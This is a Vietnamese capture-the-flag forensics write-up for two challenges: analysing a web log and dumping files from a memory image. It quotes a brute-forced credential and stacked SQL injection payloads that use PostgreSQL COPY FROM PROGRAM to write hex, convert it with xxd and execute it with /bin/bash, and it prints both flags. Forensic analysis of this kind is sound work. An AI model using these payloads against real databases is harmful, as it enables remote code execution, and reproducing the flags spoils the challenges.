![image](https://hackmd.io/_uploads/H1E_rcbwJl.png)

Nghe các em nói giải này For dễ mà hay nên tranh thủ đang rảnh háng làm rồi viết wup chơi chơi 

# Easy Log
![image](https://hackmd.io/_uploads/Hyp-S9ZDkg.png)

## Analysis
File chúng ta có là một file `evidence-log.txt`

### Brute-force Attack
![image](https://hackmd.io/_uploads/HkIoRqWD1x.png)

Đoạn đầu log ghi lại T.A đang thực hiện **brute-force**. Sau một hồi thực hiện tấn công, T.A đang tấn công thành công khi server đã trả về `200` với credential `admin:legend`

![image](https://hackmd.io/_uploads/Hkobes-PJg.png)

Sau đó T.A thực hiện các test case nhằm vào lỗ hổng **SQLi** ở các path như `/article`, `/user`

### SQLi to Create program

Ngay sau khi dò, T.A đã thực hiện một loạt hành động lặp lại liên quan đến query SQLi
```
192.168.25.1 - - [11/Jan/2025 02:53:26] GET http://secret.vsl.com.vn/user?id=1;SELECT%20*%20from%20binary HTTP/1.1 200 - Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:103.0) Gecko/20100101 Firefox/103.0"
192.168.25.1 - - [11/Jan/2025 02:53:26] "GET http://secret.vsl.com.vn/user?id=0;DROP%20TABLE%20IF%20EXISTS%20binary HTTP/1.1" 200 - "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:103.0) Gecko/20100101 Firefox/103.0"
192.168.25.1 - - [11/Jan/2025 02:53:26] "GET http://secret.vsl.com.vn/user?id=1;CREATE%20TABLE%20binary(cmd_output%20text) HTTP/1.1" 200 - "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:103.0) Gecko/20100101 Firefox/103.0"
192.168.25.1 - - [11/Jan/2025 02:53:26] "GET http://secret.vsl.com.vn/user?id=1;COPY%20binary%20FROM%20PROGRAM%20%27echo%2003003e00010000006010000000000000%20%3E%3E%20binary%27 HTTP/1.1" 200 - "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:103.0) Gecko/20100101 Firefox/103.0"
```
![image](https://hackmd.io/_uploads/BkEwtcLDJe.png)

Kết thúc dòng log xuất hiện thêm một query khác 

![image](https://hackmd.io/_uploads/SJzPj5Lwyx.png)

Decode từ URL sang nó trông như thế này
```
SELECT * from binary
DROP TABLE IF EXISTS binary
CREATE TABLE binary(cmd_output text)
COPY binary FROM PROGRAM 'echo 03003e00010000006010000000000000 >> binary'
COPY binary FROM PROGRAM 'xxd -r -p binary > binary'
COPY binary FROM PROGRAM '/bin/bash binary'
```
Giải thích hành động trên có thể như sau:
- Để tránh bị phát hiện và khả năng giới hạn input, T.A liên tục nhập các mã binary vào server nhằm mục đích liên tục "viết code" để tạo ra một chương trình
	```
	SELECT * from binary
	DROP TABLE IF EXISTS binary
	CREATE TABLE binary(cmd_output text)
	COPY binary FROM PROGRAM 'echo \03003e00010000006010000000000000 >> binary'
	```
- Sau đó sử dụng lệnh của `xxd` để chyueern nó thành dạng binary để chắc chắc chắn nó trở thành file binary
 ```
 COPY binary FROM PROGRAM 'xxd -r -p binary > binary'
 -r chuyển đổi từ hex sang bin
 -p thực hiện giải mã
 ```
- Sau đó bắn đầu chạy file với `/bin/bash binary`

Sau khi hiểu được hành vi của T.A, ta sẽ biết được bước tiếp theo làm gì : ). Đó chính là grep string lại để xem chương trình đó là gì (Khả năng flag nằm trong file này thôi)
 
### Grep String to get program
Linux thượng thừa:
```
sed -n '6230,10246p' evidence-log.txt |awk '{print $7}'| sed -n 's/.*echo%20\([^%]*\)%20%3E%3E%20binary%27/\1/p' > test.txt
- awk lấy cột thứ 7
- sed tìm và lọc theo regex
```

![image](https://hackmd.io/_uploads/Bk783oUD1e.png)

## Flag
:::spoiler Click here
```
VSL{4a7b886cf1c4ab93e740c5ef935749ce}
```
:::

# 4 parts
![image](https://hackmd.io/_uploads/ByhMB9-PJg.png)

## Analysis
```
vol.py -f evidence.raw --profile Win7SP1x64 dumpfiles -Q 0x000000007e5879f0 -D /home/remnux/Desktop/
```
...

Vì lười viết quá nên nhờ tạm [write-up của một bạn UIT viết](https://hackmd.io/@Raviyelna/SyPgXW-wJg#4-parts), rất cảm ơn bạn : )

## Flag
:::spoiler Click here
```
VSL{wh4t_h4pp3n3d_1ns1d3_my_l4pt0p_@^@omg@@}
```
:::
